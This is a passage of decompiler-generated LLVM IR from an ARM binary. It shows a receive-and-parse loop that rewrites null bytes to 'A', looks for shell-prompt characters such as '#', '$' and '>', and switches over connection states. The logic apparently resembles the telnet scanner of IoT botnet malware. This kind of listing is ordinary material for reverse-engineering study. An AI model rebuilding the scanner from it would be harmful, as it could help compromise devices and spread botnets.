  %v2_ef34175181 = icmp eq i32 %v3_ef30179, 0
  store i1 %v2_ef34175181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef34175181, label %dec_label_pc_f038, label %dec_label_pc_ef3c.lr.ph

dec_label_pc_ef30.loopexit:                       ; preds = %dec_label_pc_f944, %dec_label_pc_f748
  %v0_ef30 = load i32, i32* @r6, align 4
  %v1_ef30 = add i32 %v0_ef30, 12
  %v2_ef30 = inttoptr i32 %v1_ef30 to i32*
  %v3_ef30 = load i32, i32* %v2_ef30, align 4
  store i32 %v3_ef30, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef34175 = icmp eq i32 %v3_ef30, 0
  store i1 %v2_ef34175, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef34175, label %dec_label_pc_f038, label %dec_label_pc_ef3c.lr.ph

dec_label_pc_ef3c.lr.ph:                          ; preds = %dec_label_pc_ef30.preheader, %dec_label_pc_ef30.loopexit
  %v0_ef3c231 = phi i32 [ %v0_ef30, %dec_label_pc_ef30.loopexit ], [ %v0_ef30176, %dec_label_pc_ef30.preheader ]
  br label %dec_label_pc_ef3c

dec_label_pc_ef3c:                                ; preds = %dec_label_pc_ef34.backedge.thread, %dec_label_pc_ef34.backedge, %dec_label_pc_ef34.backedge.thread561, %dec_label_pc_ef3c.lr.ph
  %v0_fa10 = phi i32 [ %v0_ef3c231, %dec_label_pc_ef3c.lr.ph ], [ %v0_ef3c228, %dec_label_pc_ef34.backedge ], [ %v0_efb0, %dec_label_pc_ef34.backedge.thread ], [ %v0_efb0, %dec_label_pc_ef34.backedge.thread561 ]
  %v1_ef3c = add i32 %v0_fa10, 24
  %v2_ef3c = inttoptr i32 %v1_ef3c to i32*
  %v3_ef3c = load i32, i32* %v2_ef3c, align 4
  store i32 %v3_ef3c, i32* @r3, align 4
  %v2_ef40 = icmp ugt i32 %v3_ef3c, 255
  store i1 %v2_ef40, i1* %cpsr_c.global-to-local, align 1
  %v7_ef40 = icmp eq i32 %v3_ef3c, 256
  store i1 %v7_ef40, i1* %cpsr_z.global-to-local, align 1
  %.pre282 = add i32 %v0_fa10, 28
  store i32 %.pre282, i32* %sb.global-to-local, align 4
  br i1 %v7_ef40, label %dec_label_pc_fa10, label %dec_label_pc_ef4c

dec_label_pc_ef4c:                                ; preds = %dec_label_pc_ef3c, %dec_label_pc_fa10
  store i32 0, i32* @r5, align 4
  %v1_ef50 = load i32, i32* %fp.global-to-local, align 4
  %v2_ef50 = inttoptr i32 %v1_ef50 to i32*
  store i32 0, i32* %v2_ef50, align 4
  %v0_ef54 = load i32, i32* @r6, align 4
  %v1_ef54 = add i32 %v0_ef54, 24
  %v2_ef54 = inttoptr i32 %v1_ef54 to i32*
  %v3_ef54 = load i32, i32* %v2_ef54, align 4
  store i32 %v3_ef54, i32* %r2.global-to-local, align 4
  %v0_ef58 = load i32, i32* %sb.global-to-local, align 4
  %v2_ef58 = add i32 %v0_ef58, %v3_ef54
  store i32 %v2_ef58, i32* @r4, align 4
  %v1_ef5c = add i32 %v0_ef54, 4
  %v2_ef5c = inttoptr i32 %v1_ef5c to i32*
  %v3_ef5c = load i32, i32* %v2_ef5c, align 4
  store i32 %v3_ef5c, i32* %r0.global-to-local, align 4
  %v1_ef60 = sub i32 256, %v3_ef54
  store i32 %v1_ef60, i32* %r2.global-to-local, align 4
  store i32 %v2_ef58, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ef6c = call i32 @function_114b4(i32 %v3_ef5c, i32 %v2_ef58, i32 %v1_ef60, i32 16384)
  store i32 %v4_ef6c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef70 = icmp eq i32 %v4_ef6c, 0
  store i1 %v2_ef70, i1* %cpsr_z.global-to-local, align 1
  %tmp419 = icmp slt i32 %v4_ef6c, 1
  br i1 %tmp419, label %dec_label_pc_efe8, label %dec_label_pc_ef78

dec_label_pc_ef78:                                ; preds = %dec_label_pc_ef4c
  %v0_ef78 = load i32, i32* @r5, align 4
  store i32 %v0_ef78, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef7c

dec_label_pc_ef7c:                                ; preds = %.thread82, %dec_label_pc_ef78
  %v3_ef88 = phi i32 [ %v1_ef8c, %.thread82 ], [ %v0_ef78, %dec_label_pc_ef78 ]
  %v1_ef7c = load i32, i32* @r4, align 4
  %v2_ef7c = add i32 %v1_ef7c, %v3_ef88
  %v3_ef7c = inttoptr i32 %v2_ef7c to i8*
  %v4_ef7c = load i8, i8* %v3_ef7c, align 1
  %v6_ef7c = zext i8 %v4_ef7c to i32
  store i32 %v6_ef7c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef80 = icmp eq i8 %v4_ef7c, 0
  store i1 %v2_ef80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef80, label %bb420, label %.thread82

bb420:                                            ; preds = %dec_label_pc_ef7c
  %v2_ef84 = add nuw nsw i32 %v6_ef7c, 65
  store i32 %v2_ef84, i32* %r3.global-to-local, align 4
  %v2_ef88 = trunc i32 %v2_ef84 to i8
  store i8 %v2_ef88, i8* %v3_ef7c, align 1
  %v0_ef8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread82

.thread82:                                        ; preds = %dec_label_pc_ef7c, %bb420
  %v0_ef8c = phi i32 [ %v3_ef88, %dec_label_pc_ef7c ], [ %v0_ef8c.pre, %bb420 ]
  %v1_ef8c = add i32 %v0_ef8c, 1
  store i32 %v1_ef8c, i32* %r2.global-to-local, align 4
  %v3_ef90 = icmp uge i32 %v1_ef8c, %v4_ef6c
  store i1 %v3_ef90, i1* %cpsr_c.global-to-local, align 1
  %v9_ef90 = icmp eq i32 %v1_ef8c, %v4_ef6c
  store i1 %v9_ef90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef90, label %dec_label_pc_ef98, label %dec_label_pc_ef7c

dec_label_pc_ef98:                                ; preds = %.thread82, %dec_label_pc_efec
  store i32 ptrtoint (i32* @global_var_1ea18.121 to i32), i32* %r1.global-to-local, align 4
  %v0_ef9c = load i32, i32* @r6, align 4
  %v1_ef9c = add i32 %v0_ef9c, 24
  %v2_ef9c = inttoptr i32 %v1_ef9c to i32*
  %v3_ef9c = load i32, i32* %v2_ef9c, align 4
  %v2_efa0 = load i32, i32* @global_var_1ea18.121, align 4
  store i32 %v2_efa0, i32* %r2.global-to-local, align 4
  %v2_efa4 = add i32 %v3_ef9c, %v4_ef6c
  store i32 %v2_efa4, i32* %r3.global-to-local, align 4
  store i32 %v2_efa4, i32* %v2_ef9c, align 4
  %v0_efac = load i32, i32* %r2.global-to-local, align 4
  %v1_efac = load i32, i32* @r6, align 4
  %v2_efac = add i32 %v1_efac, 8
  %v3_efac = inttoptr i32 %v2_efac to i32*
  store i32 %v0_efac, i32* %v3_efac, align 4
  br label %dec_label_pc_efb0

dec_label_pc_efb0:                                ; preds = %dec_label_pc_f0cc, %dec_label_pc_ef98
  %v0_efb0 = load i32, i32* @r6, align 4
  %v1_efb0 = add i32 %v0_efb0, 12
  %v2_efb0 = inttoptr i32 %v1_efb0 to i32*
  %v3_efb0 = load i32, i32* %v2_efb0, align 4
  store i32 %v3_efb0, i32* %r0.global-to-local, align 4
  %v1_efb4 = add i32 %v3_efb0, -2
  store i32 %v1_efb4, i32* @r3, align 4
  %v7_efb8 = icmp eq i32 %v1_efb4, 8
  store i1 %v7_efb8, i1* %cpsr_z.global-to-local, align 1
  %v5_efbc = and i32 %v1_efb4, 1073741824
  %v6_efbc = icmp ne i32 %v5_efbc, 0
  store i1 %v6_efbc, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_efb0, label %dec_label_pc_ef34.backedge [
    i32 2, label %dec_label_pc_f29c
    i32 3, label %dec_label_pc_f754
    i32 4, label %dec_label_pc_f660
    i32 5, label %dec_label_pc_f440
    i32 6, label %dec_label_pc_f36c
    i32 7, label %dec_label_pc_f58c
    i32 8, label %dec_label_pc_f1c8
    i32 9, label %dec_label_pc_f0f4
    i32 10, label %dec_label_pc_f050
  ]

dec_label_pc_efe8:                                ; preds = %dec_label_pc_ef4c
  br i1 %v2_ef70, label %dec_label_pc_fb40, label %dec_label_pc_efec

dec_label_pc_efec:                                ; preds = %dec_label_pc_efe8
  %v3_efec = icmp eq i32 %v4_ef6c, -1
  store i1 %v3_efec, i1* %cpsr_c.global-to-local, align 1
  %v8_efec = icmp eq i32 %v4_ef6c, -1
  store i1 %v8_efec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_efec, label %dec_label_pc_eff4, label %dec_label_pc_ef98

dec_label_pc_eff4:                                ; preds = %dec_label_pc_efec
  %v0_eff4 = load i32, i32* %fp.global-to-local, align 4
  %v1_eff4 = inttoptr i32 %v0_eff4 to i32*
  %v2_eff4 = load i32, i32* %v1_eff4, align 4
  store i32 %v2_eff4, i32* %r3.global-to-local, align 4
  %v2_eff8 = icmp ugt i32 %v2_eff4, 10
  store i1 %v2_eff8, i1* %cpsr_c.global-to-local, align 1
  %v7_eff8 = icmp eq i32 %v2_eff4, 11
  store i1 %v7_eff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eff8, label %dec_label_pc_f038, label %dec_label_pc_f000

dec_label_pc_f000:                                ; preds = %dec_label_pc_eff4, %dec_label_pc_fb40
  %v0_f000 = load i32, i32* @r6, align 4
  %v1_f000 = add i32 %v0_f000, 4
  %v2_f000 = inttoptr i32 %v1_f000 to i32*
  %v3_f000 = load i32, i32* %v2_f000, align 4
  store i32 %v3_f000, i32* %r0.global-to-local, align 4
  %v1_f004 = call i32 @function_10dd8(i32 %v3_f000)
  store i32 %v1_f004, i32* %r0.global-to-local, align 4
  %v0_f008 = load i32, i32* @r6, align 4
  %v1_f008 = add i32 %v0_f008, 284
  %v2_f008 = inttoptr i32 %v1_f008 to i8*
  %v3_f008 = load i8, i8* %v2_f008, align 1
  %v4_f008 = zext i8 %v3_f008 to i32
  %v1_f00c = add nuw nsw i32 %v4_f008, 1
  %v1_f010 = urem i32 %v1_f00c, 256
  store i32 %v1_f010, i32* %r3.global-to-local, align 4
  %v2_f014 = icmp ugt i32 %v1_f010, 8
  store i1 %v2_f014, i1* %cpsr_c.global-to-local, align 1
  %v7_f014 = icmp eq i32 %v1_f010, 9
  store i1 %v7_f014, i1* %cpsr_z.global-to-local, align 1
  %v1_f018 = trunc i32 %v1_f00c to i8
  store i8 %v1_f018, i8* %v2_f008, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f020 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f020 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f020 = xor i1 %v1_f020, true
  %v3_f020 = and i1 %v0_f020, %v2_f020
  br i1 %v3_f020, label %bb421, label %.thread313

.thread313:                                       ; preds = %dec_label_pc_f000
  %v1_f024309314 = load i32, i32* @r6, align 4
  %v2_f024310315 = add i32 %v1_f024309314, 4
  %v3_f024311316 = inttoptr i32 %v2_f024310315 to i32*
  store i32 -1, i32* %v3_f024311316, align 4
  br label %bb422

bb421:                                            ; preds = %dec_label_pc_f000
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f024305 = load i32, i32* @r6, align 4
  %v2_f024306 = add i32 %v1_f024305, 4
  %v3_f024307 = inttoptr i32 %v2_f024306 to i32*
  store i32 -1, i32* %v3_f024307, align 4
  %v4_f028 = load i32, i32* %r3.global-to-local, align 4
  %v5_f028 = load i32, i32* @r6, align 4
  %v6_f028 = add i32 %v5_f028, 12
  %v7_f028 = inttoptr i32 %v6_f028 to i32*
  store i32 %v4_f028, i32* %v7_f028, align 4
  %v4_f02c = load i32, i32* %r3.global-to-local, align 4
  %v5_f02c = trunc i32 %v4_f02c to i8
  %v6_f02c = load i32, i32* @r6, align 4
  %v7_f02c = add i32 %v6_f02c, 284
  %v8_f02c = inttoptr i32 %v7_f02c to i8*
  store i8 %v5_f02c, i8* %v8_f02c, align 1
  %v0_f030.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f030.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb422

bb422:                                            ; preds = %.thread313, %bb421
  %v1_f034 = phi i1 [ %v1_f030.pre, %bb421 ], [ %v0_f020, %.thread313 ]
  %v0_f034 = phi i1 [ %v0_f030.pre, %bb421 ], [ %v1_f020, %.thread313 ]
  %v2_f030 = xor i1 %v1_f034, true
  %v3_f030 = or i1 %v0_f034, %v2_f030
  br i1 %v3_f030, label %bb423, label %bb424

bb423:                                            ; preds = %bb422
  %v4_f030 = load i32, i32* @r6, align 4
  store i32 %v4_f030, i32* %r0.global-to-local, align 4
  br label %bb424

bb424:                                            ; preds = %bb422, %bb423
  store i32 61496, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f030, i32 ptrtoint (i32* @global_var_e324.185 to i32))
  br label %dec_label_pc_f038

dec_label_pc_f038:                                ; preds = %dec_label_pc_ef30.loopexit, %dec_label_pc_ef34.backedge, %dec_label_pc_ef30.preheader, %dec_label_pc_eff4, %dec_label_pc_ef18, %dec_label_pc_eed0, %dec_label_pc_fb24, %bb424
  %v3_f038 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f038, i32* %r3.global-to-local, align 4
  %v1_f03c = add i32 %v3_f038, 1
  store i32 %v1_f03c, i32* @r4, align 4
  %v2_f040 = icmp ugt i32 %v1_f03c, 254
  store i1 %v2_f040, i1* %cpsr_c.global-to-local, align 1
  %v7_f040 = icmp eq i32 %v1_f03c, 255
  store i1 %v7_f040, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f03c, i32* %stack_var_-52, align 4
  %v7_f048 = icmp slt i32 %v1_f03c, 256
  br i1 %v7_f048, label %dec_label_pc_eed0, label %dec_label_pc_e850

dec_label_pc_f050:                                ; preds = %dec_label_pc_efb0
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_f054 = call i32 @function_fd60(i32 12)
  store i32 %v2_f7e4, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v3_f064 = call i32 @function_fc9c(i32 12, i32* nonnull %stack_var_-60)
  %v3_f068 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f064, i32* %r2.global-to-local, align 4
  %v1_f070 = add i32 %v3_f068, -1
  store i32 %v1_f070, i32* %r3.global-to-local, align 4
  %v0_f074 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f074, i32* %r0.global-to-local, align 4
  %v0_f078 = load i32, i32* @r6, align 4
  %v1_f078 = add i32 %v0_f078, 24
  %v2_f078 = inttoptr i32 %v1_f078 to i32*
  %v3_f078 = load i32, i32* %v2_f078, align 4
  store i32 %v3_f078, i32* %r1.global-to-local, align 4
  %v4_f07c = call i32 @function_103d0(i32 %v0_f074, i32 %v3_f078, i32 %v3_f064, i32 %v1_f070)
  %v2_f080 = icmp eq i32 %v4_f07c, -1
  store i1 %v2_f080, i1* %cpsr_c.global-to-local, align 1
  %v7_f080 = icmp eq i32 %v4_f07c, -1
  store i1 %v7_f080, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_f07c, i32* @r4, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_f948 = call i32 @function_fcc0(i32 12)
  br i1 %v7_f080, label %dec_label_pc_f944, label %dec_label_pc_f08c

dec_label_pc_f08c:                                ; preds = %dec_label_pc_f050
  store i32 %v1_f948, i32* %r0.global-to-local, align 4
  %v0_f094 = load i32, i32* @r6, align 4
  %v1_f094 = add i32 %v0_f094, 4
  %v2_f094 = inttoptr i32 %v1_f094 to i32*
  %v3_f094 = load i32, i32* %v2_f094, align 4
  store i32 %v3_f094, i32* %r0.global-to-local, align 4
  %v1_f098 = call i32 @function_10dd8(i32 %v3_f094)
  store i32 %v1_f098, i32* %r0.global-to-local, align 4
  %v0_f09c = load i32, i32* @r6, align 4
  %v1_f09c = add i32 %v0_f09c, 284
  %v2_f09c = inttoptr i32 %v1_f09c to i8*
  %v3_f09c = load i8, i8* %v2_f09c, align 1
  %v4_f09c = zext i8 %v3_f09c to i32
  %v1_f0a0 = add nuw nsw i32 %v4_f09c, 1
  %v1_f0a4 = urem i32 %v1_f0a0, 256
  store i32 %v1_f0a4, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f0ac = icmp ugt i32 %v1_f0a4, 9
  store i1 %v2_f0ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f0ac = icmp eq i32 %v1_f0a4, 10
  store i1 %v7_f0ac, i1* %cpsr_z.global-to-local, align 1
  %v2_f0b0 = add i32 %v0_f09c, 4
  %v3_f0b0 = inttoptr i32 %v2_f0b0 to i32*
  store i32 -1, i32* %v3_f0b0, align 4
  %v0_f0b4 = load i32, i32* @r3, align 4
  %v1_f0b4 = trunc i32 %v0_f0b4 to i8
  %v2_f0b4 = load i32, i32* @r6, align 4
  %v3_f0b4 = add i32 %v2_f0b4, 284
  %v4_f0b4 = inttoptr i32 %v3_f0b4 to i8*
  store i8 %v1_f0b4, i8* %v4_f0b4, align 1
  %v0_f0b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0b8, label %dec_label_pc_f0bc, label %dec_label_pc_fa34

dec_label_pc_f0bc:                                ; preds = %dec_label_pc_f08c
  store i32 0, i32* @r3, align 4
  %v1_f0c0 = load i32, i32* @r6, align 4
  %v2_f0c0 = add i32 %v1_f0c0, 12
  %v3_f0c0 = inttoptr i32 %v2_f0c0 to i32*
  store i32 0, i32* %v3_f0c0, align 4
  %v0_f0c4 = load i32, i32* @r3, align 4
  %v1_f0c4 = trunc i32 %v0_f0c4 to i8
  %v2_f0c4 = load i32, i32* @r6, align 4
  %v3_f0c4 = add i32 %v2_f0c4, 284
  %v4_f0c4 = inttoptr i32 %v3_f0c4 to i8*
  store i8 %v1_f0c4, i8* %v4_f0c4, align 1
  br label %dec_label_pc_f0c8

dec_label_pc_f0c8:                                ; preds = %dec_label_pc_fa34, %dec_label_pc_f0bc
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_f0cc

dec_label_pc_f0cc:                                ; preds = %dec_label_pc_f748, %dec_label_pc_f608, %dec_label_pc_f4bc, %dec_label_pc_f3e8, %dec_label_pc_f244, %dec_label_pc_f170, %dec_label_pc_f0c8
  %v0_f0cc = load i32, i32* @r6, align 4
  %v1_f0cc = add i32 %v0_f0cc, 24
  %v2_f0cc = inttoptr i32 %v1_f0cc to i32*
  %v3_f0cc = load i32, i32* %v2_f0cc, align 4
  %v0_f0d0 = load i32, i32* @r7, align 4
  %v2_f0d0 = sub i32 %v0_f0d0, %v3_f0cc
  %v3_f0d0 = icmp uge i32 %v0_f0d0, %v3_f0cc
  store i1 %v3_f0d0, i1* %cpsr_c.global-to-local, align 1
  %v4_f0d0 = xor i32 %v0_f0d0, %v3_f0cc
  %v5_f0d0 = xor i32 %v2_f0d0, %v0_f0d0
  %v6_f0d0 = and i32 %v5_f0d0, %v4_f0d0
  %v7_f0d0 = icmp slt i32 %v6_f0d0, 0
  %v8_f0d0 = icmp slt i32 %v2_f0d0, 0
  %v9_f0d0 = icmp eq i32 %v0_f0d0, %v3_f0cc
  store i1 %v9_f0d0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0d4 = xor i1 %v8_f0d0, %v7_f0d0
  %v0_f0d0.v3_f0cc = select i1 %v2_f0d4, i32 %v0_f0d0, i32 %v3_f0cc
  store i32 %v0_f0d0.v3_f0cc, i32* %r1.global-to-local, align 4
  %v2_f0dc = sub i32 %v3_f0cc, %v0_f0d0.v3_f0cc
  store i32 %v2_f0dc, i32* @r2, align 4
  store i32 %v2_f0dc, i32* %v2_f0cc, align 4
  %v0_f0e4 = load i32, i32* %sb.global-to-local, align 4
  %v1_f0e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_f0e4 = add i32 %v1_f0e4, %v0_f0e4
  store i32 %v2_f0e4, i32* @r1, align 4
  store i32 %v0_f0e4, i32* @r0, align 4
  %v3_f0ec = call i32 @function_112f0(i32 %v0_f0e4, i32 %v2_f0e4, i32 %v2_f0dc)
  store i32 %v3_f0ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_efb0

dec_label_pc_f0f4:                                ; preds = %dec_label_pc_efb0
  %v1_f0f4 = add i32 %v0_efb0, 24
  %v2_f0f4 = inttoptr i32 %v1_f0f4 to i32*
  %v3_f0f4 = load i32, i32* %v2_f0f4, align 4
  store i32 %v3_f0f4, i32* %r2.global-to-local, align 4
  %v1_f0f8 = add i32 %v3_f0f4, -1
  store i32 %v1_f0f8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0fc = icmp eq i32 %v1_f0f8, 0
  store i1 %v2_f0fc, i1* %cpsr_z.global-to-local, align 1
  %tmp427 = icmp slt i32 %v1_f0f8, 1
  br i1 %tmp427, label %dec_label_pc_ef34.backedge.thread, label %dec_label_pc_f104

dec_label_pc_f104:                                ; preds = %dec_label_pc_f0f4
  %v2_f104 = add i32 %v1_f0f8, %v0_efb0
  store i32 %v2_f104, i32* %r3.global-to-local, align 4
  %v1_f108 = add i32 %v2_f104, 28
  %v2_f108 = inttoptr i32 %v1_f108 to i8*
  %v3_f108 = load i8, i8* %v2_f108, align 1
  %v4_f108 = zext i8 %v3_f108 to i32
  store i32 %v4_f108, i32* %r3.global-to-local, align 4
  %v2_f10c = icmp ugt i8 %v3_f108, 61
  store i1 %v2_f10c, i1* %cpsr_c.global-to-local, align 1
  %v7_f10c = icmp eq i8 %v3_f108, 62
  store i1 %v7_f10c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f10c, label %dec_label_pc_f170, label %bb428

bb428:                                            ; preds = %dec_label_pc_f104
  %v3_f110 = icmp ugt i8 %v3_f108, 57
  store i1 %v3_f110, i1* %cpsr_c.global-to-local, align 1
  %v8_f110 = icmp eq i8 %v3_f108, 58
  store i1 %v8_f110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f110, label %dec_label_pc_f170, label %dec_label_pc_f118

dec_label_pc_f118:                                ; preds = %bb428
  %v2_f118 = icmp ugt i8 %v3_f108, 35
  store i1 %v2_f118, i1* %cpsr_c.global-to-local, align 1
  %v7_f118 = icmp eq i8 %v3_f108, 36
  store i1 %v7_f118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f118, label %dec_label_pc_f170, label %dec_label_pc_f120

dec_label_pc_f120:                                ; preds = %dec_label_pc_f118
  %v2_f120 = icmp ugt i8 %v3_f108, 34
  store i1 %v2_f120, i1* %cpsr_c.global-to-local, align 1
  %v7_f120 = icmp eq i8 %v3_f108, 35
  store i1 %v7_f120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f120, label %dec_label_pc_f170, label %dec_label_pc_f128

dec_label_pc_f128:                                ; preds = %dec_label_pc_f120
  %v2_f128 = icmp ugt i8 %v3_f108, 36
  store i1 %v2_f128, i1* %cpsr_c.global-to-local, align 1
  %v7_f128 = icmp eq i8 %v3_f108, 37
  store i1 %v7_f128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f128, label %dec_label_pc_f170, label %dec_label_pc_f158.preheader

dec_label_pc_f158.preheader:                      ; preds = %dec_label_pc_f128
  %v3_f12c = add i32 %v0_efb0, 28
  %v2_f130 = add i32 %v3_f12c, %v3_f0f4
  store i32 %v2_f130, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f158

dec_label_pc_f13c:                                ; preds = %bb429
  %v2_f13c = icmp ugt i8 %v3_f160, 35
  store i1 %v2_f13c, i1* %cpsr_c.global-to-local, align 1
  %v7_f13c = icmp eq i8 %v3_f160, 36
  store i1 %v7_f13c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f13c, label %dec_label_pc_f170, label %dec_label_pc_f144

dec_label_pc_f144:                                ; preds = %dec_label_pc_f13c
  %v2_f144 = icmp ugt i8 %v3_f160, 34
  store i1 %v2_f144, i1* %cpsr_c.global-to-local, align 1
  %v7_f144 = icmp eq i8 %v3_f160, 35
  store i1 %v7_f144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f144, label %dec_label_pc_f170, label %dec_label_pc_f14c

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f144
  %v2_f14c = icmp ugt i8 %v3_f160, 36
  store i1 %v2_f14c, i1* %cpsr_c.global-to-local, align 1
  %v7_f14c = icmp eq i8 %v3_f160, 37
  store i1 %v7_f14c, i1* %cpsr_z.global-to-local, align 1
  %v1_f150 = add i32 %v0_f150, -1
  store i32 %v1_f150, i32* %r3.global-to-local, align 4
  br i1 %v7_f14c, label %dec_label_pc_f170, label %dec_label_pc_f158

dec_label_pc_f158:                                ; preds = %dec_label_pc_f158.preheader, %dec_label_pc_f14c
  %v0_f150 = phi i32 [ %v2_f130, %dec_label_pc_f158.preheader ], [ %v1_f150, %dec_label_pc_f14c ]
  %v0_f158 = phi i32 [ %v1_f0f8, %dec_label_pc_f158.preheader ], [ %v1_f158, %dec_label_pc_f14c ]
  %v1_f158 = add i32 %v0_f158, -1
  store i32 %v1_f158, i32* %r1.global-to-local, align 4
  %v2_f158 = icmp ne i32 %v0_f158, 0
  store i1 %v2_f158, i1* %cpsr_c.global-to-local, align 1
  %v7_f158 = icmp eq i32 %v0_f158, 1
  store i1 %v7_f158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f158, label %dec_label_pc_ef34.backedge.thread561, label %dec_label_pc_f160

dec_label_pc_f160:                                ; preds = %dec_label_pc_f158
  %v1_f160 = add i32 %v0_f150, -2
  %v2_f160 = inttoptr i32 %v1_f160 to i8*
  %v3_f160 = load i8, i8* %v2_f160, align 1
  %v4_f160 = zext i8 %v3_f160 to i32
  store i32 %v4_f160, i32* %r2.global-to-local, align 4
  %v2_f164 = icmp ugt i8 %v3_f160, 61
  store i1 %v2_f164, i1* %cpsr_c.global-to-local, align 1
  %v7_f164 = icmp eq i8 %v3_f160, 62
  store i1 %v7_f164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f164, label %dec_label_pc_f170, label %bb429

bb429:                                            ; preds = %dec_label_pc_f160
  %v3_f168 = icmp ugt i8 %v3_f160, 57
  store i1 %v3_f168, i1* %cpsr_c.global-to-local, align 1
  %v8_f168 = icmp eq i8 %v3_f160, 58
  store i1 %v8_f168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f168, label %dec_label_pc_f170, label %dec_label_pc_f13c

dec_label_pc_f170:                                ; preds = %dec_label_pc_f160, %bb429, %dec_label_pc_f14c, %dec_label_pc_f144, %dec_label_pc_f13c, %dec_label_pc_f128, %dec_label_pc_f104, %dec_label_pc_f120, %dec_label_pc_f118, %bb428
  %v0_f174 = phi i32 [ %v1_f0f8, %dec_label_pc_f128 ], [ %v1_f0f8, %dec_label_pc_f104 ], [ %v1_f0f8, %dec_label_pc_f120 ], [ %v1_f0f8, %dec_label_pc_f118 ], [ %v1_f0f8, %bb428 ], [ %v1_f158, %dec_label_pc_f13c ], [ %v1_f158, %dec_label_pc_f144 ], [ %v1_f158, %dec_label_pc_f14c ], [ %v1_f158, %bb429 ], [ %v1_f158, %dec_label_pc_f160 ]
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f174 = add i32 %v0_f174, 1
  store i32 %v1_f174, i32* @r7, align 4
  %v1_f178 = call i32 @function_fd60(i32 10)
  store i32 %v2_f7e4, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_f188 = call i32 @function_fc9c(i32 10, i32* nonnull %stack_var_-60)
  store i32 %v3_f188, i32* %r0.global-to-local, align 4
  %v3_f18c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f18c, i32* %r2.global-to-local, align 4
  store i32 %v3_f188, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f198 = load i32, i32* @r6, align 4
  %v1_f198 = add i32 %v0_f198, 4
  %v2_f198 = inttoptr i32 %v1_f198 to i32*
  %v3_f198 = load i32, i32* %v2_f198, align 4
  store i32 %v3_f198, i32* %r0.global-to-local, align 4
  %v4_f19c = call i32 @function_11528(i32 %v3_f198, i32 %v3_f188, i32 %v3_f18c, i32 16384)
  store i32 %v4_f19c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f1ac = load i32, i32* @r6, align 4
  %v1_f1ac = add i32 %v0_f1ac, 4
  %v2_f1ac = inttoptr i32 %v1_f1ac to i32*
  %v3_f1ac = load i32, i32* %v2_f1ac, align 4
  store i32 %v3_f1ac, i32* %r0.global-to-local, align 4
  %v4_f1b0 = call i32 @function_11528(i32 %v3_f1ac, i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32 2, i32 16384)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f1b8 = call i32 @function_fcc0(i32 10)
  store i32 %v1_f1b8, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_f1c0 = load i32, i32* @r6, align 4
  %v2_f1c0 = add i32 %v1_f1c0, 12
  %v3_f1c0 = inttoptr i32 %v2_f1c0 to i32*
  store i32 10, i32* %v3_f1c0, align 4
  br label %dec_label_pc_f0cc

dec_label_pc_f1c8:                                ; preds = %dec_label_pc_efb0
  %v1_f1c8 = add i32 %v0_efb0, 24
  %v2_f1c8 = inttoptr i32 %v1_f1c8 to i32*
  %v3_f1c8 = load i32, i32* %v2_f1c8, align 4
